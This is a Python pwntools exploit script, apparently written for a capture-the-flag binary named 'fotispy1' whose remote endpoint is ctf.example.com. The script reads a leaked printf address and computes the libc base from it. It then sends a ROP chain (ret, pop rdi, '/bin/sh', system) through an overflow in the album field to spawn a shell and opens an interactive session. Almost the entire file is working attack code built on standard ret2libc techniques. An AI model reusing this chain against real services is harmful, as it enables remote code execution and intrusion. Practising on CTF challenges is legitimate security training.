#!/usr/bin/env python3
from pwn import *
import sys, argparse, os

elf = libc = rop = io = CUSTOM_LD = CUSTOM_LIBC = gs =  None
REMOTE = []


r, rl, ru, rr, cl = (lambda *a, **k: io.recv(*a, **k),
                     lambda *a, **k: io.recvline(*a, **k),
                     lambda *a, **k: io.recvuntil(*a, **k),
                     lambda *a, **k: io.recvregex(*a, **k),
                     lambda *a, **k: io.clean(*a, **k))

s, sa, st, sl, sla, slt, ia = (
    lambda *a, **k: io.send(*a, **k),
    lambda *a, **k: io.sendafter(*a, **k),
    lambda *a, **k: io.sendthen(*a, **k),
    lambda *a, **k: io.sendline(*a, **k),
    lambda *a, **k: io.sendlineafter(*a, **k),
    lambda *a, **k: io.sendlinethen(*a, **k),
    lambda *a, **k: io.interactive(*a, **k)
)

def parse_args():
    p = argparse.ArgumentParser(description='Exploit skeleton')
    p.add_argument('mode', choices=['local','remote','gdb','debug'], nargs='?', default='local')
    p.add_argument('--libc', help='Path to provided libc.so.6')
    p.add_argument('--ld',   help='Path to provided ld.so')
    p.add_argument('--host', help='Remote host')
    p.add_argument('--port', type=int, help='Remote port')
    p.add_argument('--no-aslr', action='store_true', help='Disable ASLR (for debugging)')
    return p.parse_args()

def build_cmd(binary):
    """Return (argv, env) tuple for process() depending on CUSTOM_LIBC/LD"""
    if CUSTOM_LD and CUSTOM_LIBC:
        # Use custom loader with library path
        lib_dir = os.path.dirname(CUSTOM_LIBC)
        argv = [CUSTOM_LD, "--library-path", lib_dir, binary]
        env = {}
        return argv, env
    elif CUSTOM_LIBC:
        # Use LD_PRELOAD
        argv = [binary]
        env = {"LD_PRELOAD": os.path.abspath(CUSTOM_LIBC)}
        return argv, env
    else:
        # Normal execution
        argv = [binary]
        env = {}
        return argv, env

def start(args, binary):
    global elf, rop, libc
    elf = context.binary = ELF(binary, checksec=False)
    rop = ROP(elf)
    if CUSTOM_LIBC:
        libc = ELF(CUSTOM_LIBC, checksec=False)
        #context.libc = libc
    else:
        libc = elf.libc
    
    rop = ROP(libc)

    argv, env = build_cmd(elf.path)
    
    if args.no_aslr:
        env['LD_PRELOAD'] = env.get('LD_PRELOAD', '') + ':' if 'LD_PRELOAD' in env else ''
        env['LD_PRELOAD'] += 'libc.so.6'  # This is a hack, better to use setarch
        # Alternative: use setarch to disable ASLR
        argv = ['setarch', 'x86_64', '-R'] + argv

    if args.mode in ('gdb','debug'):
        return gdb.debug(argv, env=env, gdbscript=gs, api=True)

    if args.mode == 'remote':
        host = args.host or (REMOTE[0] if REMOTE else None)
        port = args.port or (REMOTE[1] if len(REMOTE) > 1 else None)
        if not (host and port):
            log.error("Remote mode selected but no host/port specified!")
            log.error("Use --host/--port or set REMOTE variable")
            sys.exit(1)
        return remote(host, port)

    
    return process(argv, env=env)

def leak(description, addr):
    """Helper to leak and log addresses"""
    log.info(f"{description}: {hex(addr)}")
    return addr

def setup():
    """Initialize pwntools context"""
    context.terminal = ["terminator", "--new-tab", "-e"]
    context.log_level = 'info'
    context.timeout = 3




class Fotispy:
    def __init__(self):
        self.leak = None

    def register(self, username:bytes, password:bytes):
        sla("[E]: ", b'0')
        sla("[~] Please enter a username: ", username)
        sla("[~] Please enter a password: ", password)



    def login(self, username:bytes, password:bytes):
        sla("[E]: ", b'1')
        sla("[~] Please enter a username: ", username)
        sla("[~] Please enter a password: ", password)

    def add_song(self, artist:bytes, album:bytes) -> hex:
        sla("[E]: ", b'2')
        ru("[DEBUG] ")
        self.leak = int(rl(), 16)
        leak("printf function address", self.leak)
        
        PRINTF = libc.symbols["printf"]
        libc.address = self.leak - PRINTF
        sh = next(libc.search(b"/bin/sh"))
        system = libc.symbols["system"]


        pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
        ret = rop.find_gadget(["ret"])[0]
        #pop_rdi =  "BBBB"
        #ret = 0x000000000040101a
        nullptr =  p64(0x404051) #0x4040e8 #  0x404089 #b"AAAA"

        song = flat(
            cyclic(13),
            nullptr, # rax
            b"Y"*8, # rbp
            ret,
            pop_rdi,
            sh,
            system 
        )
        sla("[~] Please enter a song title: ", b"aaa")
        sla("[~] Please enter a who s is from: ", artist)
        sla("[~] Please enter which album s is on: ", song) 

        #return self.leak

    def display(self):
        sla("[E]: ", b'3')



def exploit():
    fotispy = Fotispy()
    fotispy.register(cyclic(0x20), cyclic(0x40))
    fotispy.login(cyclic(0x20), cyclic(0x40))

    #leak = fotispy.add_song(cyclic(0x100), cyclic(0x100), cyclic(0x100))
    #song = b"U"*0x20 + b"V"*0x20 + b"W"*0x20 + b'X'*0x20 + b"Y"*0x20
    song = cyclic(0x30)
    artist = cyclic(0x8)
    album = cyclic(0x8)

    #overwrite rax register at offset 13
    offset_rax = 13

    offset = 25
    fotispy.add_song(artist, album)
    
    fotispy.display()

    



if __name__ == "__main__":
    # Declare globals FIRST before using them
    #global io, CUSTOM_LIBC, CUSTOM_LD, gs, REMOTE

    # === per-challenge config ===
    binary = "./fotispy1"
    REMOTE = ["ctf.example.com", 1337]
    CUSTOM_LIBC = None #"./libc.so.6"
    CUSTOM_LD = None #"./ld-linux-x86-64.so.2"
    gs = """
    continue
    """
  

    setup()
    args = parse_args()
    if args.libc: CUSTOM_LIBC = args.libc
    if args.ld:   CUSTOM_LD   = args.ld

    io = start(args, binary)
    
    exploit()
    
    ia()